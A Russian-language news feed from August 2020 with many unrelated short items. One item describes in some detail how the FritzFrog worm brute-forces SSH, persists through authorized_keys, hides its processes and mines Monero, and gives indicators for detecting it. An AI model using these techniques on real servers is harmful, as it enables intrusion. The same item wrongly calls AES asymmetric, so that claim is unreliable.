Было в жизни много мистических совпадений, жена про это даже книгу написала. Мы как-то с ней должны были срочно ехать в Москву, но машина не заводилась. Сидели дома в поселке, где живём, за столом в одежде, переживали из-за опоздания. Вот бы Серёжа (наш знакомый, авто-мастер помог, спас положение, починил нашу старую машину). И вдруг, совершенно неожиданно из другого конца коридора появляется Серёжа. Я только вспомнил о нём — и он является. Говорит: «Я зашёл к вам сказать, что увольняюсь с работы. Так что, если понадобится помощь — обращайтесь, я буду рядом». Такие истории еще с юности со мной происходят. Однажды, после уроков пошли с девушками гулять, и зашли так далеко, что обратно не было сил идти. Метро тогда стоило 5 копеек, а у нас не было на всех денег. А я взял и нашёл деньги на всех, у окна лежали. Сам не понимаю, почему нагнулся и просто поднял. И еще у меня есть особенность — умею превращаться в другого человека. Но об этом пойдет речь в передаче, видео опубликую на моей страничке в Фейсбуке в юбилей 21-го августа.
 
Источники

Компания Guardicore, специализирующаяся на защите датацентров и облачных систем, выявила новое высокотехнологичное вредоносное ПО FritzFrog, поражающее серверы на базе Linux. FritzFrog сочетает в себе червь, распространяющийся через bruteforce-атаку на серверы с открытым портом SSH, и компоненты для построения децентрализованного ботнета, работающего без управляющих узлов и не имеющего единой точки отказа.
Для построения ботнента применяется собственный P2P-протокол, в котором узлы взаимодействуют между собой, координируют организацию атак, поддерживают работу сети и контролируют состояние друг друга. Новые жертвы находятся путём проведения bruteforce-атаки на серверы, принимающие запросы по SSH. При обнаружении нового сервера выполняется перебор по словарю типовых сочетаний из логинов и паролей. Управление может производиться через любой узел, что усложняет выявление и блокирование операторов ботнента.
По данным исследователей ботнет уже насчитывает около 500 узлов, в числе которых оказались серверы нескольких университетов и крупной железнодорожной компании. Отмечается, что основной целью атаки являются сети образовательных учреждений, медицинских центров, государственных учреждений, банков и телекоммуникационных компаний. После компрометации сервера на нём организуется процесс майнинга крипотвалюты Monero. Активность рассматриваемого вредоносного ПО прослеживается с января 2020 года.
Особенностью FritzFrog является то, что он держит все данные и исполняемый код только в памяти. Изменения на диске сводятся только к добавлению нового SSH-ключа в файл authorized_keys, который в дальнейшем используется для доступа к серверу. Системные файлы не изменяются, что делает червь незаметным для систем проверяющих целостность по контрольным суммам. В памяти в том числе держатся словари для перебора паролей и данные для майнинга, которые синхронизируются между узлами при помощи P2P-протокола.
В памяти вредоносные процессы камуфлируются под процессы "ifconfig", "libexec", "php-fpm" и "nginx". Узлы ботнета отслеживают состояние соседей и в случае перезагрузки сервера или даже переустановки ОС (если в новую систему был перенесён изменённый файл authorized_keys) повторно активируют вредоносные компоненты на хосте. Для коммуникации используется штатный SSH - вредоносное ПО дополнительно запускает на локальный "netcat", привязывающийся к интерфейсу localhost и слушающий трафик на порту 1234, у которому узлы обращаются через SSH-туннель, используя для подключения ключ из authorized_keys.
Код компонентов FritzFrog написан на языке Go и работает в многопоточном режиме. Вредоносное ПО включает несколько модулей, запускаемых в разных потоках:
* Cracker - выполняет подбор паролей на атакуемых серверах.
* CryptoComm + Parser - организует шифрованное P2P-соединение.
* CastVotes - механизм совместного выбора целевых хостов для атаки.
* TargetFeed - получает список узлов для атаки от соседних узлов.
* DeployMgmt - реализация червя, распространяющего вредоносный код на взломанный сервер.
* Owned - отвечает за соединение к серверам, на которых уже запущен вредоносный код.
* Assemble - собирает файл в памяти из отдельно передаваемых блоков.
* Antivir - модуль подавления конкурирующих вредоносных программ, определяет и завершает процессы со строкой "xmr", потребляющие ресурсы CPU.
* Libexec - модуль для майнинга криповалюты Monero.
Применяемый в FritzFrog P2P-протокол поддерживает около 30 команд, отвечающих за передачу данных между узлами, запуск скриптов, передачу компонентов вредоносного ПО, опрос состояния, обмен логами, запуск прокси и т.п. Информация передаётся по отдельному шифрованному каналу с сериализацией в формат JSON. Для шифрования применяется ассиметричный шифр AES и кодирование Base64. Для обмена ключей используется протокол DH (Diffie-Hellman). Для определения состояния узлы постоянно обмениваются ping-запросами. 
Все узлы ботнета поддерживают распределённую БД с информацией об атакуемых и скомпрометированных системах. Цели для атаки синхронизируются по всему ботнету - каждый узел атакует отдельную цель, т.е. два разных узла ботнента не будут атаковать один и тот же хост. Узлы также собирают и передают соседям локальную статистику, такую как размер свободной памяти, uptime, нагрузка на CPU и активность SSH-входов. Данная информация используется для решения о запуске процесса майнинга или использовании узла только для атаки других систем.
Для выявления FritzFrog исследователями предложен простой shell-скрипт. Для определения поражения системы могут использоваться такие признаки как наличие слушающего соединения на порту 1234, присутствие вредоносного ключа authorized_keys (на всех узлы устанавливается одинаковый SSH-ключ) и присутствие в памяти запущенных процессов "ifconfig", "libexec", "php-fpm" и "nginx" не имеющих связанных исполняемых файлов (без "/proc/&lt;PID&gt;/exe"). Признаком также может служить наличие трафика через сетевой порт 5555 при обращении вредоносного к типовому пулу web.xmrpool.eu для координации майнинга криптовалюты Monero.
 
Источники

Народный депутат от "Слуги народа" Артем Дмитрук заявил, что будет участвовать в борьбе за пост Одесского городского головы.
Об этом он сообщил в эфире "7 телеканала", передает RegioNews.
 
Он также добавил, что понимает, как "сложно будет выиграть эту предвыборную гонку", но заверил, что готов к трудностям.
Артем Дмитрук представляет в парламенте 133-й избирательный округ Одессы от партии "Слуга народа". До избрания он руководил фитнес-клубом в Одессе.
Напомним, Геннадий Труханов имеет наибольшую поддержку одесситов среди кандидатов на должность мэра. Его кандидатуру поддерживают 27,9% респондентов.
 
Источники

Агентство по кибербезопасности и безопасности инфраструктуры Министерства внутренней безопасности (DHS CISA) США предупредило о новом трояне для удаленного доступа BLINDINGCAN, используемом северокорейскими киберпреступниками. Как полагает ФБР, северокорейская группировка Hidden Cobra (также известна как Lazarus Group) использует вредоносное ПО BLINDINGCAN для взлома сетей и кражи данных.
По словам CISA, в начале нынешнего года Hidden Cobra в рамках вредоносной кампании атаковала государственных подрядчиков с целью похитить разведданные о ключевых военных и энергетических технологиях. Преступники использовали вредоносные документы, замаскированные под объявления о вакансиях от оборонных подрядчиков, с целью обмануть жертв, заставить их открыть файл и таким образом установить BLINDINGCAN на системе.
CISA смогло получить четыре документа Microsoft Word и две DLL-библиотеки, используемые в ходе кампании. Файлы.docx пытаются подключиться к внешним доменам для загрузки вредоноса. 32-разрядная и 64-разрядная DLL-библиотеки устанавливают 32-разрядную и 64-разрядную DLL-библиотеки с именем iconcache.db, которые распаковывают и запускают троян для удаленного доступа. Вредонос содержит встроенные функции для осуществления удаленных операций, которые обеспечивают различные возможности на системе жертвы.
 
Источники

На прошлой неделе Банк России принял решение, которое актуализирует регуляторные послабления и макропруденциальные меры, введенные в марте текущего года, - в самом начале распространения Covid-19 в России. Актуализированные Банком России меры поддержки направлены на постепенное возвращение основных показателей банковского сектора к докризисным уровням, отмечает АКРА. Вместе с тем агентство по-прежнему не исключает возможного продления сроков действия регуляторных мер до стабилизации экономической ситуации в России. Кроме того, АКРА обращает внимание на риск снижения нормативов достаточности капитала банков в 1 полугодии 2021 года как в связи с низкой рентабельностью, так и на фоне сохраняющейся необходимости доформирования резервов по кредитному портфелю, качество которого (особенно в части розничного бизнеса и МСП) уже ухудшилось и может не отражаться в отчетности в полной мере. По данным Банка России и оценке АКРА, общий объем реструктурированных с момента начала действия ограничительных мер кредитов на конец 1 полугодия 2020 года превысил 4 трлн руб. АКРА ожидает, что по значительной доле таких кредитов банки будут вынуждены создавать резервы.
''' КоронаКризис 2020: Хроника событий, мнения экспертов, уроки прошлых кризисов.'''
'''Можно ли заработать на кризисе?'''
Также АКРА не исключает восстановления отмененных мер: слабые показатели экономического роста (в пессимистичном сценарии АКРА восстановление экономики возможно не ранее 2022 года), высокая неопределенность в отношении рисков второй волны пандемии в России (ужесточения ограничительных мер), а также риски нестабильности нефтяного рынка определяют сохранение повышенной хрупкости отрасли. "Именно поэтому при сворачивании существующих мер на фоне сохранения некоторой макроэкономической неопределенности крайне важна осторожность, которая позволит регулятору своевременно оценить сопутствующие риски, а банковскому сектору выйти из сложившейся неблагоприятной экономической ситуации максимально безболезненно", - отмечает агентство.
Председатель Центрального банка Эльвира Набиуллина
 
Источники

Российский оппозиционер, основатель ФБК Алексей Навальный впал в кому после госпитализации с отравлением в Омске. Об этом сообщила его пресс-секретарь Кира Ярмыш в Twitter.
«Алексей по-прежнему на аппарате ИВЛ. Он в коме в тяжелом состоянии. Результатов анализов пока нет», ‒ написала она.
Ярмыш добавила, что Навальный находится в реанимации.
По предварительным данным, у него диагностировано острое отравление неустановленным психодислептиком (галлюциногеном), сообщает со ссылкой на источник Telegram-канал Life Shot.
Утром 20 августа Навального госпитализировали после экстренной посадки самолета в Омске, на котором он возвращался в Москву из Томска. Ярмыш сообщила, что Навальный почувствовал себя плохо в самолете, его госпитализировали с токсическим отравлением. По мнению Ярмыш, Навальному могли что-то подмешать в чай, так как, по ее словам, это единственное, что он пил с утра.
 
 
 
Источники

В Черновцах 19 августа на ул. Главной возник пожар в девятиэтажного жилом доме, а именно в подсобном помещении, где хранилось много вещей, поэтому в подъезде дома образовалось плотное задымление. Пламя и дым заметили очевидцы и вызвали спасателей.
Как передает RegioNews, об этом сообщает пресс-служба ГСЧС Украины.
 
Кроме этого, из квартиры на восьмом этаже пожарные спасли 2 детей. Мальчики 10 и 14 лет находились в тот момент сами дома. Спасатели помогли им выйти в безопасное место. Убедившись, что угрозы жизни людей нет, спасатели ликвидировали пожар на площади 10 кв. м.
Огонь уничтожил вещи домашнего обихода в подсобном помещении.
 
Напомним, что в Харьковской области в Дергачевском районе вечером 19 августа произошел пожар на предприятии по производству резиновых изделий.Пожар возник в складском помещении, где хранились изделия.
 
Источники

Президент Дональд Трамп заявил, что США изучают возможность продажи современных американских истребителей F-35 Объедиенным Арабским Эмиратам, несмотря на возражения премьер-министра Израиля Биньямина Нетаньяху.
Выступая на пресс-конференции в Белом доме, Трамп сказал, что ОАЭ выразили заинтересованность в покупке «довольно большого» количества стелс-истребителей.
По его словам, такая сделка «находится на рассмотрении», учитывая новую динамику в отношениях Израиля и ОАЭ, после того как на прошлой неделе обе страны договорились о нормализации отношений.
Возможно, не менее важным фактором является то, что ОАЭ могут позволить себе закупку этих самолетов, отметил Трамп.
«У них есть деньги, и они хотели бы заказать довольно большое количество F-35, – сказал Трамп. – Это самый лучший истребитель в мире по стелс-качествам, абсолютно невидимый».
«Они хотят купить истребители F-35, посмотрим, что из этого выйдет, – добавил он. – Сделка находится на рассмотрении, но они добились большого прогресса в установлении мира на Ближнем Востоке».
Нетаньяху заявил во вторник, что он будет выступать против такой сделки.
 
Источники

Совет директоров QIWI&nbsp;утвердил дивиденды&nbsp;за 2 квартал 2020 года в размере 33 цента на акцию. Об этом сообщила компания.
Дата&nbsp;закрытия реестра - 22 сентября 2020 года. Компания намерена выплатить дивиденды до 24 сентября 2020 года. Держатели&nbsp;ADS получат дивиденды вскоре после этой даты.
 
Источники

Историк моды Александр Васильев часто бывает в Калининградской области и хорошо знает историю региона. Он перечислил "Клопс" пять мест, которые, по его мнению, обязательно нужно посетить.
В шорт-лист вошло четыре города: Черняховск, Правдинск, Светлогорск, Советск.
В этих местах сохранилась старинная архитектура, присутствует дух времени, а ещё виден талант градостроителей и вкус архитекторов прошлого».
Ещё Васильев назвал посёлок Сосновка под Зеленоградском. Внимание историка моды привлекло хорошо сохранившееся поместье Бледау с 700-летней историей.
По словам Васильева, в Калининградской области много уникальных мест, которые способны "зацепить и увлечь туристов". Исторические здания, старинные улочки, руины средневековых замков и кирх — это то, что стоит беречь.
Прекрасное место для путешествий, наша русская Европа и наша русская Восточная Пруссия. На творения социалистического периода никто за свои же деньги любоваться не хочет, они в изобилии есть во всех бывших городах СССР. Калининградская область — наша изюминка, инжиринка и вишенка на торте. Достояние, а никак не изъян».
В начале августа историк моды Александр Васильев впервые провёл в регионе выездную школу для туристов (+16).
Все остались в восторге и от пейзажей, и от прусской кухни, и от цветов, и небольших музеев. Отель на Верхнем озере был на уровне, люди там вежливые и учтивые. Мои ученики сказали, что наконец-то оторвались от России, а это так важно именно в этот год, когда границы закрыты».
Такие школы он организуетнесколько раз в год и обычно за границей.
 
Источники

Специалисты компании Comparitech обнаружили в Сети незащищенную базу данных, содержавшую порядка 235 млн профилей пользователей сервисов Instagram, TikTok и YouTube. На сегодняшний день инцидент является одной из самых масштабных утечек данных.
Массив данных был обнаружен исследователем Бобом Дьяченко 1 августа нынешнего года. Он содержал извлеченные из публичных профилей сведения, включая логины, полные имена пользователей, контактную информацию, изображения, статистику о числе подписчиков, данные о возрасте, поле и пр.
Более 192 млн записей были связаны с пользователями Instagram, 42 млн относились к пользователям TikTok и почти 4 млн - к пользователям YouTube. Хотя вся информация является публично доступной, правила всех трех сервисов запрещают извлекать данные из профилей.
Изначально исследователи связали найденную БД с ныне несуществующей компанией Deep Social, которая в 2018 году была забанена Facebook и Instagram за извлечение данных из профилей пользователей, что запрещено политиками соцсетей. Компании даже пригрозили Deep Social судебным иском, если та не прекратит эту практику.
В ответ на запрос представители Deep Social переадресовали Дьяченко в компанию Social Data, специализирующуюся на продаже информации о популярных блогерах маркетинговым фирмам. Однако в Social Data опровергли связь с Deep Social и заявили, что не считают формирование БД противоправным действием.
«Все данные доступны любому человеку с доступом в интернет […] Даже без существования базы данных любой точно так же может прибегнуть к фишингу или связаться с любым человеком, который указывает телефон или адрес электронной почты в своем профиле в соцсетях […] Пользователи, не желающие предоставлять информацию, закрывают свои аккаунты», - подчеркнули в компании.
 
Источники

Биржевой оператор Hong Kong Exchanges and Clearing (HKEx) заявил о незначительном увеличении прибыли в первом полугодии. Так, чистая прибыль&nbsp; составила 5,23 млрд гонконгских долларов ($673,5 млн) по сравнению с 5,21 млрд гонконгских долларов годом ранее. Аналитики, тем временем, прогнозировали прибыль в размере 4,9 млрд гонконгских долларов.
Стоит отметить, что показатель оказался на рекордном уровне с момента образования биржи в 2000 году, при этом полугодовая выручка HKEx возросла на 2% г/г до $8,78 млрд.
Сообщается, что рост прибыли был обусловлен расширением объема торгов за счет размещения акций китайских технологических компаний, а также повышенной волатильностью на фоне пандемии коронавируса и политической напряженности.
 
Источники

Киевская область и Киев лидируют среди других регионов Украины по количеству поданных заявлений об изменении места голосования.
Об этом сообщает Гражданская сеть " Опора" со ссылкой на данные Государственного реестра избирателей, передает RegioNews.
Так, по состоянию на 18 августа в Киевской области 1529 граждан написали заявления об изменении избирательного адреса
 
В частности, больше всего обращений об изменении избирательного адреса в области подали в Ирпенской городской общине, а именно 308.
Ни одного обращения не зафиксировали в Дивычковской сельской общине, а также в Полесской и Кожанской поселковых общинах.
Напомним, названа сумма, которую Украина потратит на местные выборы. В Кабмине заявили, что должен состояться прозрачный избирательный процесс.
 
Источники

Туристы при бронировании гостиниц на курортах Калининградской области выбирают систему питания "полный пансион", в городских отелях ограничиваются только завтраками. Об этом, ссылаясь на данные экспертов, пишет АТОР в четверг, 20 августа.
При онлайн-бронировании туров 67% путешественников выбирают только завтраки, 8% добавляют ещё и ужины. 25% туристов при выборе гостиницы отказываются от питания.
В Калининградской области загруженность отелей до конца лета составляет 97-98%.
 
Источники

Посещать бассейны в детских садах и школах разрешат только учащимся и воспитанникам учреждений, для всех остальных они будут закрыты. Об этом рассказала глава комитета по образованию городской администрации Татьяна Петухова во время рабочего выезда в среду, 19 августа.
В тех школах, в которых есть уроки плавания в программе, они будут. Занятия на платной основе, которые раньше были востребованы среди жителей ближайших микрорайонов, вот они проводиться не будут из-за пандемии и соответствующих ограничений", — объяснила Петухова.
В администрации уточнили, что в некоторых школах и садиках уроки плавания начнутся с опозданием: чтобы соблюсти все необходимые противоэпидемические меры, может понадобиться дополнительное время.
Как с 1 сентября будут учиться калининградские дети можно почитать здесь.
 
Источники

Центральный районный суд Комсомольска-на-Амуре снизил Юлии Цветковой административный штраф с 75 до 50 тысяч рублей за картинку об ЛГБТ-семьях во «ВКонтакте». Об этом ОВД-Инфо сообщила ее мама Анна Ходырева.
Пока что неизвестно, что стало поводом для снижения суммы штрафа. Цветкова в своей апелляционной жалобе просила отменить наказание в связи с окончанием срока давности привлечение по административному делу — публикация, о которой идет речь, была сделана более года назад.
В июле Цветкову признали виновной в пропаганде нетрадиционных сексуальных отношений среди несовершеннолетних (ст. 6.21 КоАП), назначив ей 75 тысяч рублей. Пропаганду усмотрели в публикациях сообществ ВКонтакте «Тайная вечеря — ЛГБТКИАПП на-Амуре | 18» и «ЦВЕТ». Среди таких материалов — картинка «Семья там, где любовь. Поддержите ЛГБТ семьи!», и рисунок с разноцветными котятами.
 
Источники

США должны потребовать от России невмешательства в Белaруси и поддержать призыв к проведению там честных выборов.
Об этом заявил в Twitter кандидат на пост президента США от Демократической партии Джозеф Байден.
«США должны поддержать призыв Светланы Тихановской о проведении честных выборов, - отметил он. - России необходимо заявить о том, чтобы она не вмешивалась - тут дело не в геополитике, а праве выбирать своих лидеров».
Как заявил Байден, «смелые граждане Белaруси демонстрируют, что не удастся заставить их замолчать с помощью террора или пыток».
 
Источники

Службой безопасности Украины разоблачена масштабная коррупционная схема, организованная чиновниками командования Медицинских сил Вооруженных сил Украины при закупке средств индивидуальной защиты для военнослужащих.
Об этом сообщает RegioNews со ссылкой на пресс-центр СБУ.
"По данным предварительного расследования, махинацию организовали начальник управления командования Медицинских сил вместе с офицером медслужбы одной из бригад ВСУ, должностным Государственной инспекции энергетического надзора и посредником. Злоумышленники требовали от представителя коммерческой структуры, которая занимается продажей медицинских масок, взятку в размере 1 млн грн", - говорится в сообщении.
Размер неправомерной выгоды был обусловлен объемом поставки - 1 грн с каждой маски.
Оперативники спецслужбы несколько дней назад задокументировали получение злоумышленниками первой части отката в размере 400 тыс. грн.
 
Отмечается, что во время 13 обысков по местам жительства и службы злоумышленников правоохранители обнаружили средства, переданные им накануне.
Напомним, ранее сообщалось, что Служба безопасности Украины выявила многомиллионную коррупционную схему при закупках для ремонта пассажирского подвижного состава "Укрзализныци".
 
Источники

Министр финансов Сергей Марченко рассказал, что изменение т.в.о главы Государственной таможенной службы было вынужденным из-за промедления в реформировании ведомства и выполнении поручений Минфина.
Об этом он рассказал в комментарии "Интерфакс-Украина", сообщает RegioNews со ссылкой на ТСН.
Он подчеркнул, что выполнением плановых показателей наполнения бюджета было мало и нужны были сдвиги, которые не были воплощены.
 
Он добавил, что в частности и затягивались вопросы подготовки и перехода Гостаможслужбы к функционированию по модели единого юридического лица, что является ключевым направлением реформы до конца этого года.
 
Напомним, 19 августа Кабмин уволил главу Государственной таможенной службы Украины.
 
Источники

Чистая прибыль группы "Черкизово" '''в 1 полугодии 2020 года''' по МСФО составила 8,3 млрд рублей, увеличившись на 53,4% по сравнению с первым полугодием 2019 года. Скорректированная чистая прибыль выросла на 8,3% в годовом сопоставлении и составила 3,6 млрд рублей. Об этом сообщила компания.
Выручка увеличилась на 8,8% по сравнению с аналогичным периодом прошлого года до 60,6 млрд рублей.
Валовая прибыль составила 19,4 млрд рублей, что на 32,4% выше показателя за первое полугодие прошлого года.
Скорректированный показатель EBITDA увеличился на 27,7% в годовом сопоставлении, составив 10,3 млрд рублей. Рентабельность по скорректированному показателю EBITDA повысилась с 14,5% до 17,1%.
'''Во 2 квартале 2020 года''' чистая прибыль группы составила 5,3 млрд рублей, увеличившись на 140% по сравнению со вторым кварталом 2019 года. Скорректированная чистая прибыль повысилась на 75,0% в годовом сопоставлении и составила 2,3 млрд рублей.
Выручка увеличилась на 4,9% по сравнению с аналогичным периодом прошлого года - до 30,4 млрд рублей.
Валовая прибыль составила 10,6 млрд рублей, что на 42,1% выше показателя за второй квартал прошлого года.
Скорректированный показатель EBITDA* увеличился на 31,5% в годовом сопоставлении, составив 5,3 млрд рублей. Рентабельность по скорректированному показателю EBITDA выросла с 14,0% до 17,5%.
 
Источники

Прокуратура Набережных Челнов признала нарушение со стороны полицейских, которые прервали одиночный пикет активиста Василя Тарасова и отвезли его в опорный пункт для дачи объяснений. Об этом ОВД-Инфо рассказал сам Василь Тарасов.
Тарасов 30 июня встал в одиночный пикет с плакатом в поддержку политзаключенных. «Сажая людей за инакомыслие, путинский режим расписывается в собственной несостоятельности! Свободу всем политическим заключенным!», — значилось на плакате. Через 20 минут к Тарасову подошли сотрудники полиции с вопросом, согласовывал ли он одиночный пикет. Его доставили в опорный пункт, где переписали текст плаката и взяли объяснения.
Тарасов обратился в прокуратуру и УМВД Набережных Челнов с просьбой привлечь к ответственности полицейских, нарушивших его право на свободу выражения мнения и на свободу пикетирования, а также принести извинения.
Если из УМВД ему отписали об отсутствии нарушений в действиях сотрудников полиции, то прокуратура нашла «подтверждения» доводам Тарасова. Обращение об извинениях прокурор перенаправил начальнику полиции Набережных Челнов. Информация, изложенная в жалобе Тарасова, «при обобщении работы УМВД России по г. Набережные Челны будет включена в представление об устранении нарушений Федерального закона „О полиции“», — следует из ответа прокуратуры.
 
Источники

Образование новых районов и ликвидация тех, что существуют, обеспечит соответствие системы административно-территориального устройства районного уровня Украины современным требованиям и европейским стандартам.
Как сообщает RegioNews, об этом заявил на брифинге председатель КОГА Василий Володин.
 
По его словам, до создания состоятельных территориальных общин значительную часть услуг граждане получали в районных центрах. Сейчас все необходимые услуги будут предоставляться непосредственно в об&#39;объединенных территориальных общинах.
 
Напомни, больше всего граждан изменили избирательный адрес в Киеве и области
 
Источники

НАБУ сообщило о подозрении во взяточничестве одному из фигурантов коррупционного скандала в "Укроборонпроме" Виталию Жукову.
Об этом сообщил директор НАБУ Артем Сытник в интервью изданию "Украинская правда", передает RegioNews.
 
Он также отказался отвечать на вопрос о том, кому именно передавал взятку Жуков, но заверил, что в ближайшее время НАБУ "окончательно даст оценку всему тому, о чем говорилось".
По словам Сытника, к середине осени этого года ведомство "попытается дать ответы на все вопросы" по оборудкам в оборонном секторе.
Напомним, в прошлом году после журналистского расследования НАБУ открыло уголовное производства против Олега Гладковского. В октябре его арестовали и выпустили под залог. Недавно Гладковский добился возможности выезжать за пределы области.
3 июня САП и НАБУ завершили следствие по делу Гладковского, его подозревают в нанесении ущерба государству на 17,44 млн грн.
 
Источники

Турция открыла месторождение энергоносителей, скорее всего природного газа, в Черном море, сообщило Bloomberg News.
Ссылаясь на двух неназванных источников, непосредственно знакомых с ситуацией, агентство отметило, что они не указали ни объем, ни глубину залегания месторождения, и не указали, насколько сложно будет извлекать его содержимое.
Источники сообщили об этом, после того как президент Турции Реджеп Тайип Эрдоган пообещал сообщить в пятницу «хорошие новости», которые откроют новую эру в истории страны, отметило Bloomberg News.
Президент также пообещал продолжить разведку энергоресурсов в спорных районах Средиземного моря, что вызвало разногласия с Европейским Союзом.
В администрации турецкого лидера отказались от комментариев.
Согласно Bloomberg News, министр энергетики Фатих Дёнмез заявил в июле, что буровое судно Fatih начало разведку в районе турецкого города Эрегли.
 
Источники

Чилийский производитель меди Antofagasta, акции которого торгуются в Лондоне, зафиксировал снижение прибыли в первом полугодии из-за негативного воздействия пандемии коронавируса на бизнес компании.
Так, чистая прибыль составила $135,2 млн по сравнению с $302,4 млн годом ранее, тогда как скорректированная прибыль до уплаты процентов, налогов и амортизации уменьшилась на 22% г/г до $1,01 млрд, что совпало с ожиданиями аналитиков.
Тем временем, выручка компании за шесть месяцев с окончанием 30 июня сократилась на 15% г/г и составила $2,14 млрд.
Между тем, руководство компании сообщило, что выплатит промежуточные дивиденды в размере 6,2 цента на одну акцию по сравнению с 10,7 цента на бумагу за аналогичный период прошлого года.
 
Источники

В Калининградской области медикам предлагают зарплату на семь тысяч рублей  меньше, чем в среднем по России. Об этом сообщают аналитики hh.
Специалисты изучили более 650 тысяч вакансий в сфере медицины и фармацевтики, открытых с января 2019 года по июль 2020-го. В целом по России средние зарплаты, по последним данным, равнялись 43 945 рублей, в Калининградской области — 36 796 рублей. Разница между наших регионом и Москвой составила более 25 тысяч рублей — в столице медикам готовы платить 62 357 рублей.
 
Источники

Власти Лос-Анджелеса отключили электричество в арендованном доме тиктокеров, которые устроили вечеринку на фоне пандемии Covid-19.
Мэр Лос-Анджелеса Эрик Гарсетти заявил, что этот дом на Голливудских холмах, который арендуют трое популярных в США тиктокеров - Брайс Холл, Ной Бек и Блейк Грей, «превратился в ночной клуб», где проводятся вечеринки «с грубым нарушением предписаний в области здравоохранения». Поэтому власти отключили там коммунальные услуги, «чтобы остановить вечеринки, которые угрожают местным жителям», пишет NY Times.
Гарсетти уточнил, что в этом доме на последние две недели прошли как минимум две большие вечеринки. Коммунальные службы пообещали подключить все услуги обратно после приказа властей.
О том, что власти Лос-Анджелеса будут отключать коммунальные услуги в домах, где проводят вечеринки на фоне коронавируса, мэр города заявил еще 6 августа.
 
Источники

Киев станет первым городом Украины, в котором начнут применять препараты и вакцины от коронавируса, когда они поступят в производство. 
Как передает RegioNews, об этом рассказал начальник Главного управления Госпотребслужбы города Киева, врач Олег Рубан.
"Столица всегда была лидером по заболеваемости COVID-19 и другим острым респираторным вирусным инфекциям. Причина – большая миграция населения, большое количество людей из групп риска, проживающих в городе Киеве. Поэтому Киев первый зашел в эпидемию и последним будет выходить", – отметил он.
Как отмечает чиновник, сейчас в столице проводится массовое тестирование всех больных с признаками острых респираторных вирусных инфекций. У 10-15% из них подтверждается диагноз коронавирусной болезни.
 
Вместе с тем он отметил, что ситуация стабилизируется при условии, что горожане будут придерживаться всех рекомендованных правил – пользоваться медицинскими масками, антисептиками и придерживаться социальной дистанции.
 
Ранее сообщалось, что 19 августа заразились коронавирусом 2 134 человек, умерли 40 пациентов, были госпитализированы 407 человек.
 
Источники

В Израиле местные правозащитники бьют тревогу из-за продажи технологии взлома мобильных телефонов в Беларусь, где в данный момент проходят массовые акции протеста против избрания действующего Президента республики Александра Лукашенко на очередной срок. Последние несколько недель власти Беларуси жестоко подавляли протесты, в ходе которых силовики использовали огнестрельное оружие, было арестовано около 6 тысяч демонстрантов, а несколько человек погибло. Кроме этого, многие СМИ написали о пытках, которые применялись в отношении задержанных, о чём рассказывали побывавшие в СИЗО и отделениях милиции участники протестов. Жестокое подавление массовых выступлений недовольных граждан вызвало незамедлительную реакцию мирового сообщества, и недавно Евросоюз ввёл новые санкции в отношении высокопоставленных должностных лиц страны.
Недавно израильские правозащитники выяснили, что компания Cellebrite предоставила службам безопасности Беларуси технологию для взлома и извлечения данных из мобильных телефонов. Прежде Cellebrite выполнила подобный заказ для полиции Гонконга, где правительство развернуло наступление против инакомыслящих. РосКомСвобода, в свою очередь, не раз писала о том, что продукция данной компании пользуется популярностью в российских силовых органов — об этом свидетельствуют размещённые на сайте госзакупок контракты.
 
Свою обеспокоенность продажей этой технологии выразили не только правозащитники из Израиля, но и пользователи из Гонконга, которые одними из первых получили опыт противостояния с полицией, в руках которых оказалась данная система взломов мобильных устройств.
 
Технология Cellebrite обеспечивает полное извлечение файловой системы, позволяя, по сути, передавать копию данных телефона на компьютер клиента. Сама компания отказалась подтвердить, что продает оборудование в Беларусь, но информация об этом поступает напрямую от служб безопасности бывшей советской республики. Следственные органы страны опубликовали несколько официальных отчетов, подтверждающих, что власти РБ приобрели платформу криминалистической экспертизы UFED, разработанную Cellebrite, чья технология используется в Беларуси с 2016 года.
 
При этом неясно, подлежит ли экспортная деятельность Cellebrite какому-либо надзору со стороны Израиля. Министерство экономики заявило, что это входит в компетенцию министерства обороны. В ответ на запрос специализирующегося на правах человека юриста Итая Мака относительно Гонконга, министерство экономики заявило, что не несет ответственности за надзор над Cellebrite и не предоставило компании экспортную лицензию, объяснив это тем, что она подпадает под юрисдикцию министерства обороны.
Правозащитные группы обратились к органу Министерства обороны, который контролирует экспорт, с просьбой немедленно прекратить продажу в Беларусь технологии взлома телефонов Cellebrite, утверждая, что она должна соответствовать тем же строгим правилам, что и военная техника. Итай Мак написал в обращении:
 
Он добавил, что в Беларуси, единственной европейской стране, где до сих пор существует смертная казнь, деятели оппозиции время от времени просто исчезают.
«Согласно вашему письму, продукция предназначена для конечного пользователя, который входит в состав полиции или служб безопасности. Ответственность за мониторинг такого экспорта лежит на министерстве обороны. Министерство экономики не будет комментировать ваш запрос, так как это не входит в нашу компетенцию», — говорится в ответном письме Маку.
Управление по контролю за оборонным экспортом отказывается разглашать информацию о компаниях, находящихся под его контролем, а это означает, что неясно, контролируется ли экспорт Cellebrite, и если да, то кем?
«Министерство обороны не предоставляет подробную информацию о политике экспорта оборонной продукции, в том числе информацию о конкретных экспортных лицензиях. Это связано с соображениями безопасности, дипломатическими и стратегическими соображениями», — заявили в министерстве.
Недавно Cellebrite опубликовала ответ, по мнению правозащитников, ничем не отличающийся от ее реакции относительно деятельности компании в Гонконге.
«В соответствии с процедурами и политикой компании мы не отвечаем на претензии по поводу конкретных клиентов или использования нашей технологии. Мы четко следуем внутренним стандартам, определяющим способ использования наших технологий. Мы не продаем их странам, которые находятся в черном списке „Группы по противодействию легализации преступных доходов и финансированию терроризма“, созданной G-7, или которые находятся под санкциями со стороны администрации США, израильского правительства или международного сообщества. Более того, Cellebrite не занимается слежкой и не работает в этой сфере», — заявил представитель компании.
Однако Беларусь, в отличие от Гонконга, подвергается санкциям, введенным Евросоюзом в 2004 году, которые в 2011 году, после сообщений о фальсификации выборов, были расширены. Тогда же было введено эмбарго на экспорт в Беларусь продукции оборонного назначения, в том числе оборудования, которое может быть использовано против населения страны и подавления его свобод.
В своем ответе Cellebrite заявила, что не занимается «слежкой». Технология компании предназначена для криминалистической работы, а ее клиенты — службы безопасности или полиция — располагают мобильными телефонами, в которых используется технология извлечения данных.
 
Источники

"Калашников" создал малогабаритный автомат "Малыш" для самообороны. Об этом, ссылаясь на гендиректора концерна Дмитрия Тарасова, пишет "РИА Новости" в четверг, 20 августа.
В настоящее время завершился этап предварительных испытаний и идёт подготовка и изготовление опытных образцов для проведения государственных испытаний", — отметил Тарасов.
